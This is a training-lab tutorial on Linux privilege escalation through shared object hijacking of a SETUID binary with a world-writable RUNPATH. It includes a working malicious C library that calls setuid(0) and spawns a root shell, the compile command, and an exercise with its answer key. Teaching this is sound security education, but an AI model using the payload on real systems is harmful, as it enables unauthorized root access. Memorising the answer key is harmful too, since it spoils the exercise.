# Shared Object Hijacking
Programs and binaries under development usually have custom libraries associated with them. Consider the following `SETUID` binary.

```shellsession
$ ls -la payroll

-rwsr-xr-x 1 root root 16728 Sep  1 22:05 payroll
```

We can use `ldd` to print the shared object required by a binary or shared object. `Ldd` displays the location of the object and the hexadecimal address where it is loaded into memory for each of a program's dependencies.

```shellsession
$ ldd payroll

linux-vdso.so.1 =>  (0x00007ffcb3133000)
libshared.so => /development/libshared.so (0x00007f0c13112000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f7f62876000)
/lib64/ld-linux-x86-64.so.2 (0x00007f7f62c40000)
```

We see a non-standard library named `libshared.so` listed as a dependency for the binary. As stated earlier, it is possible to load shared libraries from custom locations. One such setting is the `RUNPATH` configuration. Libraries in this folder are given preference over other folders. This can be inspected using the `readelf` utility.

```shellsession
$ readelf -d payroll  | grep PATH

 0x000000000000001d (RUNPATH)            Library runpath: [/development]
```

The configuration allows the loading of libraries from the `/development` folder, which is writable by all users. This misconfiguration can be exploited by placing a malicious library in `/development`, which will take precedence over other folders because entries in this file are checked first (before other folders present in the configuration files).

We can compile a shared object which includes this function. 

```shellsession
$ ldd payroll

linux-vdso.so.1 (0x00007ffd22bbc000)
libshared.so => /development/libshared.so (0x00007f0c13112000)
/lib64/ld-linux-x86-64.so.2 (0x00007f0c1330a000)

$ cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so
$ ./payroll 

./payroll: symbol lookup error: ./payroll: undefined symbol: dbquery
```

Executing the binary throws an error stating that it failed to find the function named `dbquery`. We can compile a shared object which includes this function.

```c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

void dbquery() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
}
```

The `dbquery` function sets our user `id` to `0` (`root`) and executing `/bin/sh` when called. Compile it using GCC.

```shellsession
$ gcc src.c -fPIC -shared -o /development/libshared.so
```

Executing the binary again should display the banner and pops a root shell.

```shellsession
$ ./payroll 

***************Inlane Freight Employee Database***************

```

1. Follow the examples in this section to escalate privileges, recreate all examples (don't just run the payroll binary). Practice using ldd and readelf. Submit the version of glibc (i.e. 2.30) in use to move on to the next section. **Answer: 2.27**
   - Version of `ldd`:
        ```shellsession
        $ ldd --version
        ldd (Ubuntu GLIBC 2.27-3ubuntu1.6) 2.27
        ```
